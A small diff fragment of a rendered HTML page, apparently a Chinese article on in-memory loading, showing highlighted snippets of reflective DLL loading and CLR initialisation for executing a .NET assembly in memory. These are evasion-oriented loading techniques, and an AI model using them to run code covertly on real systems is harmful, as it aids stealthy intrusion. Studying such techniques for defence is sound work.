       <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDLLContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">int</span> var3 <span class="token operator">=</span> <span class="token class-name">ReflectiveDLL</span><span class="token punctuation">.</span><span class="token function">findReflectiveLoader</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -4546,6 +4574,7 @@ dll
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 </code></pre></div><h3>2.4. 内存加载执行.NET程序集</h3>
+<blockquote></blockquote>
 <p>1.初始化CLR环境(同上)</p>
 <div class="language-cpp" data-ext="cpp" data-title="cpp"><pre class="language-cpp"><code>	<span class="token function">CLRCreateInstance</span><span class="token punctuation">(</span>CLSID_CLRMetaHost<span class="token punctuation">,</span> IID_ICLRMetaHost<span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>iMetaHost<span class="token punctuation">)</span><span class="token punctuation">;</span>
 	iMetaHost<span class="token operator">-&gt;</span><span class="token function">GetRuntime</span><span class="token punctuation">(</span>L<span class="token string">"v4.0.30319"</span><span class="token punctuation">,</span> IID_ICLRRuntimeInfo<span class="token punctuation">,</span> <span class="token punctuation">(</span>VOID<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>iRuntimeInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
